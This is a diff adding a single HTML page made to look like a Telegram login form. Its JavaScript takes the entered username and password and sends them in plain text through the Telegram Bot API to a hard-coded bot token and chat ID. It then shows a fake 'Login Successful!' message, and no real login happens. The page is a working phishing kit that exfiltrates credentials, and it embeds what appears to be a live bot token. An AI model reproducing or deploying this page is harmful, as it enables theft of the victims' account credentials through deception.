@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Bot Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 300px;
+        }
+        h2 {
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            background-color: #33b5e5;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #1d9bde;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Telegram Login</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Enter Username" required>
+            <input type="password" id="password" placeholder="Enter Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div id="response"></div>
+    </div>
+
+    <script>
+        const botToken = "7633527726:AAE2vT6EYHRXJY8cCeP2ClCHyXRXZnfQRSk"; // Replace with your Telegram Bot API Token
+        const chatId = "6004701124"; // Replace with the chat ID you want to send messages to
+        
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            if (username && password) {
+                sendLoginDetailsToTelegram(username, password);
+            }
+        });
+
+        function sendLoginDetailsToTelegram(username, password) {
+            const message = `New Login Attempt:
+Username: ${username}
+Password: ${password}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        document.getElementById("response").innerHTML = "<p>Login Successful!</p>";
+                    } else {
+                        document.getElementById("response").innerHTML = "<p>There was an error, please try again later.</p>";
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById("response").innerHTML = "<p>There was an error, please try again later.</p>";
+                });
+        }
+    </script>
+</body>
+</html>
+
+
